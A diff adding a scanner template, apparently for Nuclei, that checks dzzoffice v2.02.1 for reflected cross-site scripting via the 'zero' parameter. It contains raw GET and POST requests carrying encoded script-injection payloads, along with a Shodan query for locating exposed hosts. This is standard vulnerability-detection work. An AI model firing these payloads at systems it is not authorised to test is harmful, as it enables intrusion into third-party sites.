@@ -1,0 +1,40 @@
+id: dzzoffice-xss
+
+info:
+  name: zyx0814/dzzoffice - Reflected Cross Site Scripting
+  author: arafatansari
+  severity: medium
+  description: |
+    dzzoffice v2.02.1 allows Reflected Cross Site Scripting via the zero parameter.
+  reference:
+    - https://github.com/zyx0814/dzzoffice/issues/183
+  metadata:
+    shodan-query: http.html:"dzzoffice"
+    verified: "true"
+  tags: xss
+
+requests:
+  - raw:
+      - |
+        GET /index.php?mod=system&op=orgtree&zero=%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E HTTP/1
+        Host: {{Hostname}}
+        
+      - |  
+        POST /index.php?mod=system&op=orgtree&do=orgtree HTTP/1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Referer: {{Hostname}}/index.php?mod=system&op=orgtree&zero=abc%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E       
+
+        id=%23&nouser=0&moderator=0&zero=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&stype=0&range=0&showjob=0         
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '<script>alert(1)<\/script>'
